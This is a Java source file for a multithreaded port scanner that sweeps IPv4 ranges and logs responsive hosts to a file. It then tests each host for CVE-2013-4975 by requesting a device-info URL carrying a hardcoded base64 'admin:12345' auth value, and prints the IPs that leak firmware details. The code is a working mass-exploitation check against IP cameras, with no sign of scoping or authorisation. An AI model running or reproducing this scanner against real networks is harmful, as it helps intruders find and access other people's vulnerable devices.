package scanner;

import lombok.SneakyThrows;
import okhttp3.Response;
import okhttp3.ResponseBody;
import scanner.http.Converter;
import scanner.http.HttpClient;
import scanner.http.IpV4Address;
import scanner.http.IpV4Range;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class PortScanner {

    private final String CVE_2013_4975 = "http://%s/system/deviceInfo?auth=YWRtaW46MTIzNDU=";

    private final List<InetSocketAddress> addresses = new ArrayList<>();
    private final Converter converter = new Converter();
    private final HttpClient client = new HttpClient();

    private final List<String> result = new ArrayList<>();
    private final File file;

    public PortScanner(String path) {
        this.file = new File(path);
    }

    public void prepareSinglePortScanning(String rangeAsString, int port) {
        addresses.clear();
        IpV4Range rangeContainer = new IpV4Range(rangeAsString);
        List<IpV4Address> range = rangeContainer.range();
        for (IpV4Address address : range)
            addresses.add(converter.convert(address, port));
    }

    @SneakyThrows
    public void scanning() {
        ExecutorService executorService = Executors.newFixedThreadPool(20);
        HashSet<PortExecutor> callables = new HashSet<>();

        for (InetSocketAddress address : addresses)
            callables.add(new PortExecutor(address));

        List<Future<Optional<String>>> futures = executorService.invokeAll(callables);
        for (Future<Optional<String>> future : futures)
            future.get().ifPresent(result::add);
    }

    public void checkCve20134975() {
        for (String ip : result) {
            try (Response response = client.execute(String.format(CVE_2013_4975, ip))) {
                ResponseBody responseBody = response.body();
                if (Objects.nonNull(responseBody)) {
                    String body = responseBody.string();
                    if (body.contains("firmware"))
                        System.out.println(ip);
                }
            } catch (IOException ignored) {}
        }
    }

    @SneakyThrows
    public void flush() {
        FileWriter writer = new FileWriter(file, true);
        for (String ip : result)
            writer.append(ip).append("\n");
        writer.close();
        result.clear();
    }

}
